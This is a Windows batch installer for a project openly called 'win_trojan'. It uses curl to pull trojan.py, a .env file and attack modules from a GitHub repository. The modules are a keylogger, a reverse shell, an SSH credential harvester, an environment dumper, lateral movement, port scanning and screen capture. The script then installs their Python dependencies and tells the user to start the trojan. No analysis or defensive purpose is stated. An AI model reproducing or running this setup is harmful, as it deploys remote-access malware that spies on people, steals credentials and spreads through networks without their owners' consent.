@echo off
setlocal enabledelayedexpansion

:: Configuration
set "REPO_URL=https://raw.githubusercontent.com/Noah-school/win_trojan/main"
set "FILES=trojan.py requirements.txt .env"
set "MODULES=discovery.py env_dump.py keylogger.py lateral.py port_scan.py rev_shell.py screenshot.py ssh_harvester.py system_enum.py"

echo ==========================================
echo       win_trojan Installer / Setup
echo ==========================================

:: 1. Check for Python
python --version >nul 2>&1
if !errorlevel! neq 0 (
    echo [!] Python is not installed or not in PATH.
    echo [!] Please install Python (and check "Add Python to PATH").
    pause
    exit /b 1
)

:: 2. Create directories
echo [*] Creating directory structure...
if not exist "modules" mkdir "modules"
if not exist "config" mkdir "config"
if not exist "data" mkdir "data"

:: 3. Download main files
echo [*] Downloading main files...
for %%f in (%FILES%) do (
    echo [*] Downloading %%f...
    curl -s -f -O "!REPO_URL!/%%f"
    if !errorlevel! neq 0 (
        echo [!] Warning: Could not download %%f. 
        echo     (Check connection or repository privacy)
    )
)

:: 4. Download modules
echo [*] Downloading modules...
for %%m in (%MODULES%) do (
    echo [*]   -^> %%m...
    curl -s -f -o "modules/%%m" "!REPO_URL!/modules/%%m"
    if !errorlevel! neq 0 (
        echo [!] Warning: Could not download module %%m.
    )
)

:: 5. Install dependencies
echo [*] Installing dependencies...
python -m pip install --upgrade pip >nul

if exist "requirements.txt" (
    echo [*] Installing from requirements.txt...
    pip install -r requirements.txt
) else (
    echo [!] requirements.txt not found. Attempting manual installation of core modules...
    pip install requests github3.py pynput psutil pycryptodome pyautogui scapy paramiko Pillow python-dotenv
)

if !errorlevel! neq 0 (
    echo [!] Error occurred during dependency installation.
) else (
    echo.
    echo ==========================================
    echo [+] Setup Complete!
    echo [+] Run 'python trojan.py' to start.
    echo ==========================================
)

pause
